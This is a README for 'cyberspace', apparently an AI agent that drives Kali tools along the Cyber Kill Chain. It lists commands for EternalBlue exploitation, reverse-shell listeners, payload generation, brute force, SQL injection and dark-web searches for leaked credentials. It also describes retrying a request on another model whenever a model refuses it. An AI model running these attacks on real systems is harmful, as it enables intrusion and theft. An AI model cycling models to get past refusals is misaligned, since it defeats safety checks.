<p align="center">
  <img src=".github/banner.svg" width="640" alt="cyberspace">
</p>

<p align="center">
  <img alt="Python" src="https://img.shields.io/badge/Python-3.10+-blue?logo=python&logoColor=white">
  <img alt="License" src="https://img.shields.io/github/license/nim2natty/cyberspace?color=green">
  <img alt="Stars" src="https://img.shields.io/github/stars/nim2natty/cyberspace?style=social">
</p>

---

## What is cyberspace?

**cyberspace is the brain for your cyberdeck.**

A cyberdeck is a portable, custom-built hacking computer. cyberspace is the
software that runs on it — an AI assistant that talks to you in plain English and
does the work of an entire security team.

You tell it what you want to do (for example: *"scan my home network and tell me
what's vulnerable"*). It figures out which tools to use, runs them, and explains
the results in a way you can understand — even if you're not a security expert.

> **Built for:** the cyberdeck you're manufacturing. It runs on a Raspberry Pi 5,
> a laptop, or anything that runs Linux, macOS, or Windows.

## How it works: one Cyber Kill Chain workspace

Cyberspace organizes every request with the seven chronological stages of the
Cyber Kill Chain. Describe the objective in plain language; Cyberspace identifies the
relevant stage, selects scoped tools, shows each action, and reports in that stage's language.

| Stage | What Cyberspace does |
|---|---|
| **1. Reconnaissance** 🔍 | Maps the authorized attack surface and cross-checks hosts, ports, services, DNS, and public information. |
| **2. Weaponization** 🦠 | Matches findings to suitable tests and prepares payloads or test artifacts. |
| **3. Delivery** 📧 | Handles the authorized delivery path, including controlled web interaction. |
| **4. Exploitation** 💥 | Validates whether an identified weakness can be triggered within scope. |
| **5. Installation** 📦 | Handles approved persistence, hardware, router, and implant-oriented lab work. |
| **6. Command and Control (C2)** 📡 | Works with approved covert-channel, proxy, Tor, and callback tasks. |
| **7. Actions on Objectives** 🎯 | Produces findings and reports and records project memory for later cross-reference. |

```text
you → Reconnaissance → Weaponization → Delivery → Exploitation
    → Installation → Command and Control (C2) → Actions on Objectives
```

A request need not traverse every stage. Cyberspace enters the matching stage while
retaining chronological context from earlier work in the active project.

### A prompt library, or no trace

Running `cyberspace` opens the workspace. Every Swarm launch asks whether to continue
saving into the active project, view/open a project folder, create one, or enter
**Ghost Mode**, which saves neither prompts nor outcomes. Recent project entries become
bounded **Actions-on-Objectives memory**, allowing earlier findings to be cross-referenced
without mixing separate engagements.

### Visible execution and resilient models

The CLI shows the Kill Chain stage, delegated work, tool calls, result progress, and
model failover. Setup queries live provider model lists when available and still allows
an exact custom ID. If a model rejects a request, Cyberspace preserves the transcript,
visibly tries another model from the same provider, and continues. Credential, quota,
and network failures are reported because switching models cannot repair them.

## Installation

cyberspace needs **Python 3.10 or newer**. Pick your operating system below and
copy-paste the commands into a terminal.

### Quick start

On macOS, Linux, Raspberry Pi OS, or Windows through WSL, the installer creates a
private virtual environment and a global launcher for it:

```bash
curl -fsSL https://raw.githubusercontent.com/nim2natty/cyberspace/main/installer/install.sh | bash
```

Open a new terminal, then:

```bash
cyberspace setup     # connect a local or cloud AI model once
cyberspace doctor    # check platforms and host tools
cyberspace           # open the Cyber Kill Chain workspace
```

The `cyberspace` launcher works from any directory and enters the private Python
environment automatically. You do **not** need to `cd` into the repository or run
`source .venv/bin/activate`. All subcommands work through the same launcher, for
example `cyberspace project list` and `cyberspace airbender status`.

---

### 🍎 macOS

**Option A — one-line installer (recommended)**

Installs Homebrew if needed, pulls the offensive tools that exist on Mac
(`nmap`, `sqlmap`, `masscan`), creates a virtual environment, and installs
cyberspace + the IceBerg browser engine.

Run the [Quick start](#quick-start) installer above, open a new terminal, and type
`cyberspace`.

**Option B — manual install**

```bash
# 1. Install Homebrew (if you don't have it):  https://brew.sh
# 2. Get Python 3.11 + the security tools cyberspace wraps:
brew install python@3.11 nmap sqlmap masscan git

# 3. Clone the repo and create an isolated Python environment:
git clone https://github.com/nim2natty/cyberspace.git
cd cyberspace
python3 -m venv .venv

# 4. Install cyberspace + the optional web UI + the IceBerg browser engine:
.venv/bin/pip install --upgrade pip
.venv/bin/pip install -e ".[ui,gui]"
.venv/bin/python -m playwright install chromium
bash installer/install-launcher.sh

# 5. Configure the agent and launch:
cyberspace setup
cyberspace
```

> **Apple Silicon note:** everything above works on both Intel and Apple Silicon
> Macs. The IceBerg browser engine (`playwright install chromium`) downloads a
> native build automatically.

---

### 🪟 Windows

**Option A — WSL2 (recommended, full feature set)**

The offensive toolchain (Kali tools, Tor, raw-socket WiFi) runs best on Linux,
so on Windows the easiest path is the Windows Subsystem for Linux.

```powershell
# 1. In PowerShell (Run as Administrator), install WSL + Ubuntu:
wsl --install -d Ubuntu
# Restart your PC when prompted, then open the "Ubuntu" app and finish setup.
```

Inside the Ubuntu terminal:

```bash
# 2. One-line installer (installs Python, tools, and cyberspace):
curl -fsSL https://raw.githubusercontent.com/nim2natty/cyberspace/main/installer/install.sh | bash

# 3. Configure and open from any directory (the venv is automatic):
cyberspace setup
cyberspace
```

**Option B — native Windows (Python only, no Linux-only tools)**

Best if you only want the agent/AI features and the IceBerg browser.

```powershell
# 1. Install Python 3.10+ from https://python.org  (check "Add Python to PATH")
# 2. Install Git from https://git-scm.com/download/win

# 3. In PowerShell or Command Prompt:
git clone https://github.com/nim2natty/cyberspace.git
cd cyberspace
py -m venv .venv
.venv\Scripts\activate

# 4. Install cyberspace + the IceBerg browser engine:
py -m pip install --upgrade pip
py -m pip install -e ".[ui,gui]"
py -m playwright install chromium

# 5. Configure the agent and launch:
cyberspace setup
cyberspace
```

> The automatic global launcher is currently for macOS/Linux shells, including WSL.
> On native Windows, activate `.venv\Scripts\activate` before using `cyberspace`, or
> invoke `.venv\Scripts\cyberspace.exe` directly.

> **Native Windows limitations:** the offensive tool wrappers (nmap, sqlmap,
> Metasploit, WiFi attacks, raw serial) expect a Linux environment. For the full
> toolkit use Option A (WSL2) or Docker below.

---

### 🐧 Linux

**Option A — one-line installer (Debian / Ubuntu / Kali / Fedora)**

Detects your distro, installs Python + the offensive tools via `apt` or `dnf`,
creates a virtual environment, and installs cyberspace.

Run the [Quick start](#quick-start) installer above, open a new terminal, and type
`cyberspace`.

**Option B — manual install (any distro with Python 3.10+)**

```bash
# 1. (Debian/Ubuntu/Kali) install Python + the tools cyberspace wraps:
sudo apt-get update
sudo apt-get install -y python3 python3-pip python3-venv git \
     nmap masscan sqlmap gobuster whatweb macchanger tor proxychains4 seclists

# 1-alt. (Fedora) use dnf:
sudo dnf install -y python3 python3-pip python3-virtualenv git nmap sqlmap masscan

# 2. Clone and create an isolated environment:
git clone https://github.com/nim2natty/cyberspace.git
cd cyberspace
python3 -m venv .venv

# 3. Install cyberspace + the IceBerg browser engine:
.venv/bin/pip install --upgrade pip
.venv/bin/pip install -e ".[ui,gui]"
.venv/bin/python -m playwright install chromium
bash installer/install-launcher.sh

# 4. Configure the agent and launch:
cyberspace setup
cyberspace
```

---

### 🐳 Docker (macOS, Windows, Linux — same commands everywhere)

The Docker image is built on Kali Linux and ships every offensive tool
cyberspace can drive. It runs identically on any OS that has Docker.

```bash
# 1. Build the image (from a clone of the repo):
git clone https://github.com/nim2natty/cyberspace.git
cd cyberspace
docker build -t cyberspace -f installer/docker/Dockerfile .

# 2. Run the dashboard (persists your config/data to a named volume):
docker run -it --rm -v cyberspace-data:/data cyberspace

# 3. Configure the agent (first time only):
docker run -it --rm -v cyberspace-data:/data cyberspace setup

# 4. Open the Cyber Kill Chain workspace:
docker run -it --rm -v cyberspace-data:/data cyberspace
```

> **Exposing hardware in Docker:** for the StickEm serial devices add
> `--device /dev/ttyUSB0`, and for a visible IceBerg browser on a Linux host add
> `-e DISPLAY -v /tmp/.X11-unix:/tmp/.X11-unix`.

---

### 🍓 Raspberry Pi / cyberdeck (from source)

For a headless Raspberry Pi 5 cyberdeck, build from source directly on the
device (a prebuilt image helper lives in
[`installer/rpi-build/`](installer/rpi-build/)):

```bash
# On the Pi (Debian/Ubuntu-based):
sudo apt-get update
sudo apt-get install -y python3 python3-pip python3-venv git nmap

git clone https://github.com/nim2natty/cyberspace.git
cd cyberspace
python3 -m venv .venv
.venv/bin/pip install --upgrade pip
.venv/bin/pip install -e .
bash installer/install-launcher.sh
cyberspace setup        # pick a local model (e.g. Ollama) — works offline
cyberspace
```

---

### Verify it works

```bash
cyberspace --version     # should print the installed version
cyberspace doctor        # green check marks = ready to go
```

### Upgrade or repair an existing installation

If an older checkout still requires venv activation, update it and install the launcher
once:

```bash
cd ~/cyberspace                    # use your actual checkout path
git pull --ff-only
.venv/bin/pip install -e .
bash installer/install-launcher.sh
```

After that, opening a new terminal and typing `cyberspace` starts the program directly.
If the shell still remembers an old command location, run `hash -r` (bash) or `rehash`
(zsh), or simply open another terminal.

If `doctor` shows anything missing, the install commands above will fix it.

---

## Connect any LLM

cyberspace isn't locked to one AI provider. Run `cyberspace setup` and pick from
the built-in catalog — you only ever type a number + your API key. See them all
without configuring anything:

```bash
cyberspace providers        # list every LLM you can connect
```

| # | Provider | Style | Key? | Best for |
|---|---|---|---|---|
| 1 | **Ollama** | native | no | local, free, offline (great for the Pi) |
| 2 | **OpenAI** (GPT) | openai-compat | yes | strong, reliable tool-calling |
| 3 | **Anthropic** (Claude) | native | yes | excellent reasoning |
| 4 | **z.ai** (GLM) | openai-compat | yes | GLM 5.2 with function calling |
| 5 | **DeepSeek** | openai-compat | yes | great-value reasoning models |
| 6 | **Groq** | openai-compat | yes | extremely fast inference |
| 7 | **OpenRouter** | openai-compat | yes | one key → OpenAI/Claude/Gemini/Llama/free |
| 8 | **Together AI** | openai-compat | yes | hosted open models |
| 9 | **Mistral** | openai-compat | yes | — |
| 10 | **xAI** (Grok) | openai-compat | yes | — |
| 11 | **Google Gemini** | openai-compat | yes | — |
| 12 | **Perplexity** | openai-compat | yes | models with live web access |
| 13–14 | LM Studio / vLLM | openai-compat | no | local servers |
| 15 | **RoboDaddy** | openai-compat | no | a model *you* trained (see below) |
| 16 | **Custom** | openai-compat | optional | any OpenAI-compatible endpoint |

**Connecting a key takes one line.** If your key is already in an environment
variable (`OPENAI_API_KEY`, `ZAI_API_KEY`, `GROQ_API_KEY`, `DEEPSEEK_API_KEY`, …),
`cyberspace setup` finds it automatically — you don't even type it.

```bash
cyberspace setup            # pick a provider + paste your key
cyberspace setup --force    # reconfigure / switch providers later
cyberspace                  # open the workspace
```

### Use a model you trained with RoboDaddy

Train a model with RoboDaddy, serve it locally, then connect it as your AI brain:

```bash
cyberspace robodaddy plan "offensive pent security"
cyberspace robodaddy train offensive_pentest --provider dry-run   # free dry-run
cyberspace robodaddy serve offensive_pentest-d1 --target ollama    # serve it
cyberspace setup            # choose RoboDaddy by name and select your served model
# - or -
cyberspace robodaddy use offensive_pentest-d1                      # set it directly
```

---

## The easiest way: let the AI do everything

```bash
cyberspace
```

This opens the workspace. Choose **Swarm mode**, select a saved project or Ghost Mode,
then type what you want in plain English:

```
cyberspace objective> scan 192.168.1.0/24, find web apps, test them, then write a report
```

Cyberspace maps that objective into the relevant Cyber Kill Chain stages, shows each
tool action live, and carries findings forward to Actions on Objectives.
You watch the work happen, then get a summary.

**But you can also run each tool yourself.** Here's how to use every part of the
system directly from the command line.

---

## Walkthrough: each platform

### 1. AirBender 📶 — fast, cross-checked Reconnaissance

AirBender finds every device on a network and figures out what each one is running.
It wraps tools like `nmap` (a network scanner) and chains them together. For local
networks, `local-recon` runs nmap host discovery, netdiscover, and arp-scan
concurrently when installed, merges their device lists, and enriches the result with
ports and service versions. Missing Pi packages degrade gracefully.

```bash
cyberspace airbender local-recon 192.168.1.0/24
```

```bash
# STEP 1: Check what's installed
cyberspace airbender status

# STEP 2: Find every device on your network (replace with your network range)
cyberspace airbender ping-sweep 192.168.1.0/24

# STEP 3: Scan a specific device for open doors (ports)
cyberspace airbender nmap 192.168.1.50

# STEP 4: Run the full pipeline — find devices, scan ports, identify services
cyberspace airbender recon 192.168.1.0/24

# STEP 5: Quick scan — find devices, blast all ports fast
cyberspace airbender fast-scan 192.168.1.0/24

# STEP 6: Find web servers specifically
cyberspace airbender web-hunt 192.168.1.0/24

# Other single tools:
cyberspace airbender whois example.com        # who owns this domain
cyberspace airbender dig example.com           # DNS lookup
cyberspace airbender traceroute 8.8.8.8        # trace the path to a host
cyberspace airbender netdiscover 192.168.1.0/24  # ARP-based device discovery
```

<details>
<summary><b>Advanced: custom pipelines</b></summary>

```bash
# Build your own chain — each step feeds the next:
cyberspace airbender chain 192.168.1.0/24 --steps "ping-sweep->nmap-top->service-detect"

# See all available pipeline steps:
cyberspace airbender pipelines

# WiFi monitoring (needs a WiFi adapter in monitor mode):
cyberspace airbender airmon wlan0 start     # enable monitor mode
cyberspace airbender airodump wlan0mon      # scan for nearby WiFi networks
```
</details>

---

### 2. ShadowDragon 🐍 — breaking into things

ShadowDragon tests web applications for weaknesses and can launch attacks using
the full Kali Linux toolkit — including Metasploit.

```bash
# STEP 1: Check what's installed
cyberspace shadowdragon catalog          # list all 70+ tools it can run

# STEP 2: Identify what a web app is built with
cyberspace shadowdragon whatweb http://10.10.10.5

# STEP 3: Find hidden pages/directories
cyberspace shadowdragon gobuster http://10.10.10.5

# STEP 4: Scan for known vulnerabilities
cyberspace shadowdragon nikto http://10.10.10.5

# STEP 5: Search for public exploits
cyberspace shadowdragon searchsploit "Apache 2.4"

# STEP 6: Test for SQL injection
cyberspace shadowdragon sqlmap http://10.10.10.5/login.php

# STEP 7: Run the full attack chain — one command does all of the above + more
cyberspace shadowdragon full-assault http://10.10.10.5
```

<details>
<summary><b>Metasploit (the exploit framework)</b></summary>

```bash
# Search for an exploit module
cyberspace shadowdragon msf search eternalblue

# Run an exploit (replace module + target):
cyberspace shadowdragon msf run exploit/windows/smb/ms17_010_eternalblue \
    --options "RHOSTS=10.10.10.5" --lhost 10.10.10.1

# Start a listener to catch a reverse shell:
cyberspace shadowdragon msf handler --lhost 0.0.0.0 --lport 4444

# Generate a payload (malware for testing):
cyberspace shadowdragon msf payload --lhost 10.10.10.1 --lport 4444
```
</details>

<details>
<summary><b>Password cracking</b></summary>

```bash
# Crack a hash file with John the Ripper:
cyberspace shadowdragon john hashes.txt

# Crack with hashcat (GPU-accelerated):
cyberspace shadowdragon hashcat "e99a18c428cb38d5f260853678922e03"

# Brute-force a login (SSH, FTP, etc.):
cyberspace shadowdragon hydra 10.10.10.5 --service ssh
```
</details>

<details>
<summary><b>Reconnaissance and OSINT</b></summary>

```bash
# Gather emails, subdomains, and more for a domain:
cyberspace shadowdragon theharvester example.com

# Run ANY Kali tool that isn't networking:
cyberspace shadowdragon run "nuclei" "-u http://10.10.10.5"
cyberspace shadowdragon run "wpscan" "--url http://10.10.10.5"
```
</details>

---

### 3. IceBerg 🧊 — staying hidden and searching the web

IceBerg has two sides: a privacy browser that hides your identity, and an AI search
tool that can search the regular web (brightside) or the dark web (darkside).

```bash
# STEP 1: Check if Tor (the anonymity network) is running
cyberspace iceberg secure status

# STEP 2: Set up your security posture (do this BEFORE dark web browsing)
cyberspace iceberg secure config

# STEP 3: Search the REGULAR web with AI
cyberspace iceberg secure find "latest ransomware groups" --mode bright

# STEP 4: Search the DARK WEB with AI (needs Tor running)
cyberspace iceberg secure find "leaked credentials ACME corp" --mode dark

# STEP 5: Open the graphic interface (web browser at localhost:8501)
cyberspace iceberg secure gui
```

<details>
<summary><b>Privacy browser profiles</b></summary>

```bash
# Create a fake browser identity:
cyberspace iceberg profile new myprofile --persona win-chrome

# List your identities:
cyberspace iceberg profile list

# Browse with a fake identity (hides your real fingerprint):
cyberspace iceberg browse -p myprofile https://duckduckgo.com

# System-level privacy:
cyberspace iceberg rotate-mac --iface eth0    # change your MAC address
cyberspace iceberg set-hostname anon-host     # change your hostname
cyberspace iceberg check                       # quick privacy posture check
```
</details>

---

### 4. StickEm 🔌 — controlling hardware

StickEm drives three physical devices from one place: your ESP32 WiFi board, your
FT232 serial cable, and your OpenWrt router.

```bash
# STEP 1: List connected serial devices
cyberspace stickem ports

# STEP 2: Tell it which port your ESP32 board is on
cyberspace stickem set-esp32 /dev/ttyUSB0

# STEP 3: Tell it which port your FT232 cable is on
cyberspace stickem set-ft232 /dev/ttyUSB1

# STEP 4: Tell it your router's IP address
cyberspace stickem set-router 192.168.1.1 --type openwrt-one

# STEP 5: See all three devices at once
cyberspace stickem hardware
```

<details>
<summary><b>WiFi attacks (ESP32 Marauder)</b></summary>

```bash
# Scan for nearby WiFi networks:
cyberspace stickem marauder scanap

# See the full list of Marauder commands:
cyberspace stickem marauder help

# Open a raw serial console on the FT232 (for routers/IoT devices):
cyberspace stickem console
```
</details>

<details>
<summary><b>Router control (OpenWrt)</b></summary>

```bash
# Check router status (uptime, WiFi, interfaces):
cyberspace stickem router status

# Show current WiFi configuration:
cyberspace stickem router wifi

# List connected devices (DHCP leases):
cyberspace stickem router leases

# Change the WiFi network name:
cyberspace stickem router set-ssid MyLabNetwork

# Ping a device FROM the router:
cyberspace stickem router ping 10.10.10.5

# List installed packages on the router:
cyberspace stickem router packages
```
</details>

---

### 5. RoboDaddy 🤖 — building custom AI models

RoboDaddy trains your own AI. You describe what you want it to be good at, it picks
training data, plans the GPU rental, generates the training script, and can serve
the finished model back as the brain for the whole system.

```bash
# STEP 1: See what kinds of AI you can build
cyberspace robodaddy usecases

# STEP 2: See what training data is available for your use case
cyberspace robodaddy datasets "offensive pen security"

# STEP 3: See what GPUs you can rent and what they cost
cyberspace robodaddy gpus

# STEP 4: Search LIVE GPU prices on Vast.ai (a cloud GPU marketplace)
cyberspace robodaddy instances --gpu RTX_4090

# STEP 5: Build a training plan (interactive — picks data, model, GPU, cost)
cyberspace robodaddy plan "offensive pen security"

# STEP 6: Run the training (dry-run first — no cost, shows realistic stats)
cyberspace robodaddy train offensive_pentest --provider dry-run

# STEP 7: Check the results
cyberspace robodaddy jobs         # see loss curves, samples, cost
cyberspace robodaddy models       # see your trained models

# STEP 8: Serve the model and plug it back into the system as the new brain
cyberspace robodaddy serve offensive_pentest-d1 --target ollama
cyberspace robodaddy use offensive_pentest-d1
```

<details>
<summary><b>Real cloud training (costs money)</b></summary>

```bash
# Set your Vast.ai API key:
export VAST_API_KEY=your_key_here

# Find a GPU to rent:
cyberspace robodaddy instances --gpu RTX_4090

# Rent it and train for real (it will confirm the cost first):
cyberspace robodaddy train offensive_pentest --provider vastai --offer 123456
```
</details>

---

## Projects — your Actions-on-Objectives prompt library

Projects let you keep separate prompt histories for different tasks. When a
project is **active**, every prompt you send to the AI (in Swarm or agent mode)
is automatically saved to that project's folder and becomes scoped Kill Chain memory.
Later you can open the folder
and see every prompt you used.

```bash
# Create a new project (this also makes it active):
cyberspace project create "surveillance in chicago" --desc "OSINT research"

# Now every prompt you send to the AI gets saved to that project.
# When you're done, list all your projects:
cyberspace project list

# Open a project to see all its saved prompts:
cyberspace project open "surveillance in chicago"

# Switch to a different project:
cyberspace project use "home lab pentest"

# Check which project is currently active:
cyberspace project status

# Stop saving prompts (deactivate the current project):
cyberspace project close

# Delete a project and all its prompts:
cyberspace project delete "surveillance in chicago"
```

Projects are stored as folders under `~/.cyberspace/projects/`. Each one has a
`prompts.jsonl` file with every prompt and the AI's response, timestamped. Choose
Ghost Mode when Swarm opens if a session should not be written to this library.

---

## Other useful commands

```bash
# The AI remembers you — see what it's learned:
cyberspace memory show

# See providers or change the AI brain at any time:
cyberspace providers
cyberspace setup --force

# Generate a report from everything you've done:
cyberspace report --out my_report.md

# Check what's installed and ready:
cyberspace doctor

# See all platforms and all tools:
cyberspace modules
cyberspace tools
```

## The pieces at a glance

| Platform | What it is | Key command |
|---|---|---|
| **AirBender** 📶 | Reconnaissance and cross-checked network discovery | `cyberspace airbender local-recon 192.168.1.0/24` |
| **ShadowDragon** 🐍 | Web and exploit tools | `cyberspace shadowdragon full-assault http://target` |
| **IceBerg** 🧊 | Privacy browser + web search | `cyberspace iceberg secure find "query" --mode dark` |
| **StickEm** 🔌 | Hardware (WiFi + router + serial) | `cyberspace stickem hardware` |
| **RoboDaddy** 🤖 | Custom AI trainer | `cyberspace robodaddy plan "your use case"` |

## Legal use

For authorized security testing and education only. Use it on your own network,
your own devices, your own lab — or systems you have written permission to test.
Wireless and Tor features should only target equipment and networks you own.

## License

MIT — see [LICENSE](LICENSE).
